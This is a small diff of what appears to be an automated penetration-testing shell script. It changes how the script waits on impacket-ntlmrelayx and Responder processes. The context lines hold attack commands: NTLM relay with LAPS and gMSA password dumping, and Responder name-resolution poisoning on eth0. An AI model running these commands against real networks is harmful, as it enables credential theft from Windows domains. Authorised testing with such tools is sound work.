@@ -62,11 +62,8 @@ timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/outp
 sleep 5
 timeout 300 responder -I eth0 -wvFP &>/root/output/responder.txt &
 
-PID_RELAY=$(jobs -l | awk '/ntlmrelayx/ {print$2}')
-PID_RESPONDER=$(jobs -l | awk '/responder/ {print$2}')
-
-wait "$PID_RESPONDER"
-wait "$PID_RELAY"
+wait "$(pgrep -f ntlmrelayx.py)"
+wait "$(pgrep -f Responder.py)"
 
 #Python unbuffered reset to default
 unset PYTHONUNBUFFERED
